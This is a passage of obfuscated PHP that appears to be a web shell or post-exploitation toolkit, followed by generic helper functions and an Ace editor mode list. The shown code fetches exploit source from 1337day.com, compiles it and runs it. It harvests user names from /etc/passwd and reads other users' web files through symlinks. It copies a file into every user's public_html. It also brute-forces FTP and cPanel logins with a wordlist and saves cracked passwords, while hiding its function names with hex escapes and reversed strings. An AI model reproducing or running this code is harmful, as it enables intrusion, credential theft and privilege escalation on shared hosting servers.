    print("[+] ".$exploits[2][$i]."\n<br>");
    $feather($socket,"Trying pwn this server with this exploit\n");
    print("Trying pwn this server with this exploit\n<br>");
    $exploit_link = "http://www.1337day.com/exploit/$exploit";
    $feather($socket,"Downloading => ".$exploit_link."\n");
    print("Downloading => ".$exploit_link."\n<br>");
    ob_flush();flush();
    $download = $this->day1337download($exploit_link);
    if($download != false)
    {
    $feather($socket,"File downloaded saved as $download\n");
    print("File downloaded saved as $download\n<br>");
    $feather($socket,"Trying compile to $download file\n");
    print("Trying compile to $download file\n<br>");
    ob_flush();flush();
    $withoutc = str_replace(".c","",$download);
    @$shellfish("gcc $download -o $withoutc");
    if(file_exists($withoutc))
    {
    $feather($socket,"File compiled\n");
    print("File compiled\n<br>");
    $feather($socket,"Setting chmod options\n");
    print("Setting chmod options\n<br>");
    @$shellfish("chmod +x $withoutc");
    $feather($socket,"Running exploit..!\n");
    print("Running exploit..!\n<br>");
    ob_flush();flush();
    @$shellfish("./$withoutc");
    }
    else
    {
    $feather($socket,"File doesn't compile\n");
    print("File doesn't compile\n<br>");
    ob_flush();flush();
    }
    
    }
    
    }
    $feather($socket,"==================== Possible Exploits =====================\n");
    print("==================== Possible Exploits =====================\n<br>");
    ob_flush();flush();
    }
    else
    {
    $feather($socket,"Not found any exploits\n");
    print("Not found any exploits\n<br>");
    ob_flush();flush();
    }
  }
  private function curl($site,$post=null)
  {
      $corral = "\x63u\x72\x6C\x5Fc\x6C\x6Fs\x65";
    $corralfish = "\x63u\x72l_e" . strrev("cex");
  $ch = curl_init();
  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
  curl_setopt($ch,CURLOPT_URL,$site);
  if($post != null)
  {
  curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
  }
  $cex = $corralfish($ch);
  $corral($ch);
  return $cex;
  }
  private function download($url)
  {
  	$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
  $prgm('#\/exploits\/(.+)#si',$url,$filename);
  $filename = $filename[1].".c";
  $url    = str_replace("exploits","download",$url);
  $openurl  = @file_get_contents($url);
  if($openurl && file_put_contents($filename,$openurl)){
  return $filename;
  }
  else
  {
  return false;
  }
  
  }
  private function day1337download($url)
  {
  	$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
  $prgm('#\/exploit\/(.+)#si',$url,$filename);
  $filename = $filename[1].".c";
  $data    = $this->curl($url,"agree=Ok");
  $prgm("#<pre class='brush: plain; tab-size: 8'>(.*?)<\/pre>#si",$data,$content);
  if(file_put_contents($filename,$content))
  {
  return $filename;
  }
  else
  {
  return false;
  }
  
  }
  private function grab_users($socket)
  {
      $feather = strrev("rwf") . "ite";
  $read = file("/etc/passwd");
  $x0x  = "";
  foreach($read as $text)
  {
  $text = trim($text);
  $user = explode(":",$text);
  $user = $user[0];
  $xox .= $user."\r\n";
  $feather($socket,$user."\n");
  print($user."\n");
  }
  $feather($socket,"Grabbed ".count($read)." users from /etc/passwd\n");
  print("Grabbed ".count($read)." users from /etc/passwd\n");
  $save = $this->save_as("users",$xox,"wb");
  if($save){$feather($socket,"Saved into file as 'users'\n");print("Saved into file as 'users'\n");}else{$feather($socket,"Doesn't save into file\n");print("Doesn't save into file\n");}
  }
  private function catln($file,$socket)
  {
$shellfish = "shell_\x65\x78\x65c";
$feather = strrev("rwf") . "ite";
  $savefile = uniqid();
  @$shellfish("ln -s $file ".$savefile);
  if(file_exists($savefile))
  {
  $feather($socket,file_get_contents($savefile));
  print(file_get_contents($savefile));
  $feather($socket,"File name $savefile\n");
  print("File name $savefile\n");
  }
  else
  {
  $feather($socket,"File doesn't read\n");
  print("File doesn't read\n");
  }
  
  }
  private function index($file,$socket)
  {
$shellfish = "shell_\x65\x78\x65c";
$feather = strrev("rwf") . "ite";
  $etc  = file('/etc/passwd');
  $count= 0;
  foreach($etc as $txt)
  {
  $txt = trim($txt);
  $user= explode(":",$txt);
  $user= $user[0];
  $path= "/home/$user/public_html/$file";
  @$shellfish("cp $file $path");
  if(file_exists($path))
  {
  $feather($socket,"File created: ".$path."\n");
  print("File created: ".$path."\n");
  $count++;
  }
  
  }
  $feather($socket,"Completed\n");
  print("Completed\n");
  $feather($socket,"File copied into $count dirs\n");
  print("File copied into $count dirs\n");
  }
  private function getf($file,$socket)
  {
$shellfish = "shell_\x65\x78\x65c";
$feather = strrev("rwf") . "ite";
  $etc   = file('/etc/passwd');
  $count = 0; 
  foreach($etc as $txt)
  {
  $txt = trim($txt);
  $user= explode(":",$txt);
  $user= $user[0];
  $path= "/home/$user/public_html/$file";
  if(file_exists($path))
  {
  $feather($socket,"File found: ".$path."\n");
  print("File found: ".$path."\n");
  $content = file_get_contents($path);
  if($content)
  {
  $save = $this->save_as($user."-".$file,$content);
  if($save){
  $feather($socket,"File is readable,saved into file named $user-$file\n");
  print("File is readable,saved into file named $user-$file\n");
  $count++;
  }
  else
  {
  $feather($socket,"File is readable but current dir is not writable\n");
  print("File is readable but current dir is not writable\n");
  }
  
  }
  else
  {
  @$shellfish("ln -s $path $user-$file");
  if(file_exists($user[0]."-".$file)){
  $feather($socket,"File is read with ln -s method,saved into file named $user-$file\n");
  print("File is read with ln -s method,saved into file named $user-$file\n");
  $count++;
  }
  else
  {
  $feather($socket,"File is not readable\n");
  print("File is not readable\n");
  }
  
  }
  
  }
  
  }
  $feather($socket,"Grabbed $count files\n");
  print("Grabbed $count files\n");
  
  }
  private function domains($socket)
  {
  $x0x   = "";
  $c     = 0;
  $path    = "/var/named";
  $dir_handle = @opendir($path);
  $feather = strrev("rwf") . "ite";
  if($dir_handle)
  {
  while ($file = readdir($dir_handle)) 
  {
  if (!is_dir($path."/".$file) AND ($file != "..") AND ($file != ".")) { 
  $dosya = str_replace(".db","",$file);
  $feather($socket,$dosya."\n");
  print($dosya."\n");
  $x0x .= $dosya."\r\n";
  $c++;
  }

  }
  $save = $this->save_as("d0mains",$x0x,"wb");
  if($save == false){$feather($socket,"Got domains but can't save into a file this dir is not writable\n");print("Got domains but can't save into a file this dir is not writable\n");}
  else
  {
  $feather($socket,"Grabbed $c domains\n");
  print("Grabbed $c domains\n");
  $feather($socket,"Saved into 'd0mains'\n");
  print("Saved into 'd0mains'\n");
  }
  closedir($dir_handle);
  } 
  else
  {
  $feather($socket,"Doesn't read /var/named\n");
  print("Doesn't read /var/named\n");
  }
  
  }
  private function ftp($wordlist,$socket)
  {
  	$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
      $manycorralfish = "c\x75\r\x6C\x5Fm\x75\x6C\x74\x69\x5F\x65\x78\x65c";
  	$feather = strrev("rwf") . "ite";
  $feather($socket,"Starting ftp crack..\n");
  ob_flush();flush();
  $open = file($wordlist);
  $userx= array();
  foreach($open as $pwd)
  {
  $pwd = trim($pwd);
  $feather($socket,"Password ".$pwd." trying on all users\n");
  ob_flush();flush();
  $users= file('/etc/passwd');
  foreach($users as $user)
  {
  $user = trim($user);
  $user = explode(":",$user);
  $user = $user[0];
  $userx[] = $user;
  }
  $userx = array_filter($userx);
  $userx = array_unique($userx);
  $userx = array_chunk($userx,25);
  $multi = curl_multi_init();
  foreach($userx as $u)
  {
    for($i=0;$i<=count($u)-1;$i++)
    {
    $curl[$i] = curl_init();
    curl_setopt($curl[$i],CURLOPT_RETURNTRANSFER,1);
    curl_setopt($curl[$i],CURLOPT_URL,"ftp://".$this->server_ip);
    curl_setopt($curl[$i],CURLOPT_USERPWD,trim($u[$i]).":".$pwd);
    curl_setopt($curl[$i],CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($curl[$i],CURLOPT_TIMEOUT,4);
    curl_multi_add_handle($multi,$curl[$i]);
    }
    do
    {
    $manycorralfish($multi,$active);
    usleep(1);
    }while($active>0);
    foreach($curl as $cid => $cend)
    {
    $data[$cid] = curl_multi_getcontent($cend);
    if($prgm('#drw#si',$data[$cid]))
    {
    $feather($socket,"Found username: $u[$cid] , password: $pwd\n");
    print("<font color='red'>Found username: $u[$cid] , password: $pwd</font>\n");
    $save = $this->save_as("ftps.txt","Found username: $u[$cid] , password: $pwd\r\n","ab");
    ob_flush();flush();
    }
    else
    {
    $feather($socket,"Not found $u[$cid]:$pwd\n");
    print("Not found $u[$cid]:$pwd\n");
    ob_flush();flush();
    }
    curl_multi_remove_handle($multi,$cend);
    }
  }
  
  }
  
  }
  private function cpanel($wordlist,$socket)
  {
      $manycorralfish = "c\x75\r\x6C\x5Fm\x75\x6C\x74\x69\x5F\x65\x78\x65c";
      $feather = strrev("rwf") . "ite";
  $feather($socket,"Starting cpanel crack..\n");
  ob_flush();flush();
  $open = file($wordlist);
  $userx= array();
  foreach($open as $pwd)
  {
  $pwd = trim($pwd);
  $feather($socket,"Password ".$pwd." trying on all users\n");
  ob_flush();flush();
  $users= file('/etc/passwd');
  foreach($users as $user)
  {
  $user = trim($user);
  $user = explode(":",$user);
  $user = $user[0];
  $userx[] = $user;
  }
  $userx = array_filter($userx);
  $userx = array_unique($userx);
  $userx = array_chunk($userx,25);
  $multi = curl_multi_init();
  foreach($userx as $u)
  {
    for($i=0;$i<=count($u)-1;$i++)
    {
    $curl[$i] = curl_init();
    curl_setopt($curl[$i],CURLOPT_RETURNTRANSFER,1);
    curl_setopt($curl[$i],CURLOPT_URL,"https://$this->server_ip:2083/login/?login_only=1");
    curl_setopt($curl[$i],CURLOPT_POSTFIELDS,"user=".trim($u[$i])."&pass=$pwd");
    curl_setopt($curl[$i],CURLOPT_SSL_VERIFYPEER,0);
    curl_setopt($curl[$i],CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($curl[$i],CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($curl[$i],CURLOPT_TIMEOUT,4);
    curl_multi_add_handle($multi,$curl[$i]);
    }
    do
    {
    $manycorralfish($multi,$active);
    usleep(1);
    }while($active>0);
    foreach($curl as $cid => $cend)
    {
    $data[$cid] = curl_getinfo($cend);
    if($data[$cid]['http_code'] != 401)
    {
    $feather($socket,"Found username: $u[$cid] , password: $pwd\n");
    print("<font color='red'>Found username: $u[$cid] , password: $pwd</font>\n");
    $save = $this->save_as("cpanels.txt","Found username: $u[$cid] , password: $pwd\r\n","ab");
    ob_flush();flush();
    }
    else
    {
    $feather($socket,"Not found $u[$cid]:$pwd\n");
    print("Not found $u[$cid]:$pwd\n");
    ob_flush();flush();
    }
    curl_multi_remove_handle($multi,$cend);
    }
  }
  
  }
  
  }
  private function save_as($filename,$content,$type='ab')
  {
     $feather = strrev("rwf") . "ite";
    $pixel = strrev("cf") . "lose";
$pen = strrev("of") . 'pen';
  $fap = $pen($filename,$type);
  if($fap)
  {
  $feather($fap,$content);
  $pixel($fap);
  return true;
  }
  else
  {
  return false;
  }
  
  }
}
function PermsColor($f) {
	if (!is_readable($f)) {
		return '<span class="red">'.getPerms($f).'</span>';
	} elseif (!is_writable($f)) {
		return '<span class="black">'.getPerms($f).'</span>';
	} else {
		return '<span class="green">'.getPerms($f).'</span>';
	}
}
function printaceext(){
	
?>
<script>
ace.define("ace/ext/modelist",["require","exports","module"], function(require, exports, module) {
"use strict";

var modes = [];
function getModeForPath(path) {
    var mode = modesByName.text;
    var fileName = path.split(/[\/\\]/).pop();
    for (var i = 0; i < modes.length; i++) {
        if (modes[i].supportsFile(fileName)) {
            mode = modes[i];
            break;
        }
    }
    return mode;
}

var Mode = function(name, caption, extensions) {
    this.name = name;
    this.caption = caption;
    this.mode = "ace/mode/" + name;
    this.extensions = extensions;
    if (/\^/.test(extensions)) {
        var re = extensions.replace(/\|(\^)?/g, function(a, b){
            return "$|" + (b ? "^" : "^.*\\.");
        }) + "$";
    } else {
        var re = "^.*\\.(" + extensions + ")$";
    }

    this.extRe = new RegExp(re, "gi");
};

Mode.prototype.supportsFile = function(filename) {
    return filename.match(this.extRe);
};
var supportedModes = {
    ABAP:        ["abap"],
    ActionScript:["as"],
    ADA:         ["ada|adb"],
    Apache_Conf: ["^htaccess|^htgroups|^htpasswd|^conf|htaccess|htgroups|htpasswd"],
    AsciiDoc:    ["asciidoc"],
    Assembly_x86:["asm"],
    AutoHotKey:  ["ahk"],
    BatchFile:   ["bat|cmd"],
    C9Search:    ["c9search_results"],
    C_Cpp:       ["cpp|c|cc|cxx|h|hh|hpp"],
    Cirru:       ["cirru|cr"],
    Clojure:     ["clj|cljs"],
    Cobol:       ["CBL|COB"],
    coffee:      ["coffee|cf|cson|^Cakefile"],
    ColdFusion:  ["cfm"],
    CSharp:      ["cs"],
    CSS:         ["css"],
    Curly:       ["curly"],
    D:           ["d|di"],
    Dart:        ["dart"],
    Diff:        ["diff|patch"],
    Dockerfile:  ["^Dockerfile"],
    Dot:         ["dot"],
    Erlang:      ["erl|hrl"],
    EJS:         ["ejs"],
    Forth:       ["frt|fs|ldr"],
    FTL:         ["ftl"],
    Gherkin:     ["feature"],
    Gitignore:   ["^.gitignore"],
    Glsl:        ["glsl|frag|vert"],
    golang:      ["go"],
    Groovy:      ["groovy"],
    HAML:        ["haml"],
    Handlebars:  ["hbs|handlebars|tpl|mustache"],
    Haskell:     ["hs"],
    haXe:        ["hx"],
    HTML:        ["html|htm|xhtml"],
    HTML_Ruby:   ["erb|rhtml|html.erb"],
    INI:         ["ini|conf|cfg|prefs"],
    Jack:        ["jack"],
    Jade:        ["jade"],
    Java:        ["java"],
    JavaScript:  ["js|jsm"],
    JSON:        ["json"],
    JSONiq:      ["jq"],
    JSP:         ["jsp"],
    JSX:         ["jsx"],
    Julia:       ["jl"],
    LaTeX:       ["tex|latex|ltx|bib"],
    LESS:        ["less"],
    Liquid:      ["liquid"],
    Lisp:        ["lisp"],
    LiveScript:  ["ls"],
    LogiQL:      ["logic|lql"],
    LSL:         ["lsl"],
    Lua:         ["lua"],
    LuaPage:     ["lp"],
    Lucene:      ["lucene"],
    Makefile:    ["^Makefile|^GNUmakefile|^makefile|^OCamlMakefile|make"],
    MATLAB:      ["matlab"],
    Markdown:    ["md|markdown"],
    MEL:         ["mel"],
    MySQL:       ["mysql"],
    MUSHCode:    ["mc|mush"],
    Nix:         ["nix"],
    ObjectiveC:  ["m|mm"],
    OCaml:       ["ml|mli"],
    Pascal:      ["pas|p"],
    Perl:        ["pl|pm"],
    pgSQL:       ["pgsql"],
    PHP:         ["php|phtml"],
    Powershell:  ["ps1"],
    Prolog:      ["plg|prolog"],
    Properties:  ["properties"],
    Protobuf:    ["proto"],
    Python:      ["py"],
    R:           ["r"],
    RDoc:        ["Rd"],
    RHTML:       ["Rhtml"],
    Ruby:        ["rb|ru|gemspec|rake|^Guardfile|^Rakefile|^Gemfile"],
    Rust:        ["rs"],
    SASS:        ["sass"],
    SCAD:        ["scad"],
    Scala:       ["scala"],
    Smarty:      ["smarty|tpl"],
    Scheme:      ["scm|rkt"],
    SCSS:        ["scss"],
    SH:          ["sh|bash|^.bashrc"],
    SJS:         ["sjs"],
    Space:       ["space"],
    snippets:    ["snippets"],
    Soy_Template:["soy"],
    SQL:         ["sql"],
    Stylus:      ["styl|stylus"],
    SVG:         ["svg"],
    Tcl:         ["tcl"],
    Tex:         ["tex"],
    Text:        ["txt"],
    Textile:     ["textile"],
    Toml:        ["toml"],
    Twig:        ["twig"],
    Typescript:  ["ts|typescript|str"],
    Vala:        ["vala"],
    VBScript:    ["vbs"],
    Velocity:    ["vm"],
    Verilog:     ["v|vh|sv|svh"],
    XML:         ["xml|rdf|rss|wsdl|xslt|atom|mathml|mml|xul|xbl"],
    XQuery:      ["xq"],
    YAML:        ["yaml|yml"]
};

var nameOverrides = {
    ObjectiveC: "Objective-C",
    CSharp: "C#",
    golang: "Go",
    C_Cpp: "C/C++",
    coffee: "CoffeeScript",
    HTML_Ruby: "HTML (Ruby)",
    FTL: "FreeMarker"
};
var modesByName = {};
for (var name in supportedModes) {
    var data = supportedModes[name];
    var displayName = (nameOverrides[name] || name).replace(/_/g, " ");
    var filename = name.toLowerCase();
    var mode = new Mode(filename, displayName, data[0]);
    modesByName[filename] = mode;
    modes.push(mode);
}

module.exports = {
    getModeForPath: getModeForPath,
    modes: modes,
    modesByName: modesByName
};

});
;
                (function() {
                    ace.require(["ace/ext/modelist"], function() {});
                })();
</script>

<?PHP
}
function endsWith($haystack, $needle) {
    // search forward starting from end minus needle length characters
    return $needle === "" || strpos($haystack, $needle, strlen($haystack) - strlen($needle)) !== FALSE;
}
function get_files_from_folder($directory, $put_into, $z) {
	if ($handle = opendir($directory)) {
		while (false !== ($file = readdir($handle))) {
			if (is_file($directory.$file)) {
				$z->addFile($directory.$file, $put_into.$file);
			} elseif ($file != '.' and $file != '..' and is_dir($directory.$file)) {
				$z->addEmptyDir($put_into.$file.'/');
				get_files_from_folder($directory.$file.'/', $put_into.$file.'/',$z);
			}
		}
	}
	closedir($handle);
}
function get_file_list($directory) {
    $all = "";
	if ($handle = opendir($directory)) {
		while (false !== ($file = readdir($handle))) {
			if (is_file($directory.$file)) {
				$all .= $directory.$file;
			} elseif ($file != '.' and $file != '..' and is_dir($directory.$file)) {
				$all .= $directory . $file;
				$all .= get_file_list($directory.$file.'/');
			}
		}
	}
	closedir($handle);
	return $all;
}
function str_replace_first($search, $replace, $subject) {
    $pos = strpos($subject, $search);
    if ($pos !== false) {
        $subject = substr_replace($subject, $replace, $pos, strlen($search));
    }
    return $subject;
}
function suhosin_func_exists($func) {
    if (extension_loaded('suhosin')) {
        $suhosin = @ini_get("suhosin.ex\x65cutor.func.bl\x61cklist");
        if (empty($suhosin) == false) {
            $suhosin = explode(',', $suhosin);
            $suhosin = array_map('trim', $suhosin);
            $suhosin = array_map('strtolower', $suhosin);
            return (function_exists($func) == true && array_search($func, $suhosin) === false);
        }
    }
    return function_exists($func);
}
function closetags($html) {
    $prgma = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68\x5f\x61\x6c\x6c";
    $prgma('#<(?!meta|img|br|hr|input\b)\b([a-z]+)(?: .*)?(?<![/|/ ])>#iU', $html, $result);
    $openedtags = $result[1];
    $prgma('#</([a-z]+)>#iU', $html, $result);
    $closedtags = $result[1];
    $len_opened = count($openedtags);
    if (count($closedtags) == $len_opened) {
        return $html;
    }
    $openedtags = array_reverse($openedtags);
    for ($i=0; $i < $len_opened; $i++) {
        if (!in_array($openedtags[$i], $closedtags)) {
            $html .= '</'.$openedtags[$i].'>';
        } else {
            unset($closedtags[array_search($openedtags[$i], $closedtags)]);
        }
    }
    return $html;
}
function list2array($list) {
    $array = explode(',', $list);
    $return = array();
    foreach ($array as $value) {
        $explode2 = explode('-', $value);
        if (count($explode2) > 1) {
            $range = range($explode2[0], $explode2[1]); 
            $return = array_merge($return, $range);
        } else {
            $return[] = (int) $value;
        }
    }
    return $return;
}
function pr($s){
    echo "<pre>" . print_r($s) . '</pre>';
}
function glob_recursive($pattern, $flags = 0){
    $files = glob($pattern, $flags);
    foreach (glob(dirname($pattern).'/*', GLOB_ONLYDIR|GLOB_NOSORT) as $dir){
        $files = array_merge($files, glob_recursive($dir.'/'.basename($pattern), $flags));
    }
    return $files;
}
die();
